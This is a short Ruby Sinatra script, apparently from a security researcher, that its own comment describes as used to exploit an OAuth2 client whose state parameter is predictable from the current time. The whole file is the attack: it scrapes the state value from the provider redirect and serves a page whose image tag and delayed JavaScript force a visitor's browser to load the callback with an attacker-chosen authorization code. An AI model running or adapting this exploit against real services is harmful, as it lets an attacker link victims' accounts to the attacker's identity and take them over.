require 'net/http' 
require 'uri'
require 'sinatra'

set:port, 80
set:bind, '0.0.0.0'

# Another script i used to exploit an Oauth2 implementation that uses a predictable State parameter based on the current time 


get '/' do
	uri = URI('http://oauth-client.so/users/auth/myprovider')
	resp=Net::HTTP.get_response(uri)
	red=resp.header['Location'] 
	state=red.scan(/state=(\d+)/)[0][0]
	base_redirect="http://oauth-client.so/users/auth/myprovider/callback?code=0a25eda6e5e02ab54fa3f393aa7fa365a499ef9633eab0b7ec8471f168aadddf&state="
	str="<img src='http://oauth-client.so/users/auth/myprovider' />"
	str+="<script>	const myTimeout = setTimeout(Linking, 2000);"
	str+="function Linking() { "
	str+=" document.write(\"<img src='#{base_redirect}#{state}' />\"); "
	str+="}</script>"

	puts str
	str
end

